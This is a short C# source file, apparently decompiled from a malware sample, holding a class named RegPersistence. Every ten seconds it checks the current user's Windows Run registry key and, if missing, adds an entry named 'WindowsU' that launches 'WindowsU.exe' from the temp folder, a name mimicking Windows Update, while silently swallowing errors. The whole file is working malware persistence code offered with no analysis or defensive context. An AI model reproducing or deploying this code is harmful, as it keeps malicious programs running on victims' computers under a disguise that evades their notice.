using System;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace datav;

[StandardModule]
internal sealed class RegPersistence
{
	private static string MyPath = Path.GetTempPath() + "WindowsU.exe";

	private static string MyValue = "WindowsU";

	public static void Persistence()
	{
		while (true)
		{
			if (!CheckKey())
			{
				AddKey();
			}
			Thread.Sleep(10000);
		}
	}

	private static bool CheckKey()
	{
		string text = null;
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		string[] valueNames = registryKey.GetValueNames();
		registryKey.Close();
		string[] array = valueNames;
		foreach (string text2 in array)
		{
			text = text + text2 + "|";
		}
		if (text.Contains(MyValue))
		{
			return true;
		}
		return false;
	}

	private static void AddKey()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue(MyValue, MyPath);
			registryKey.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
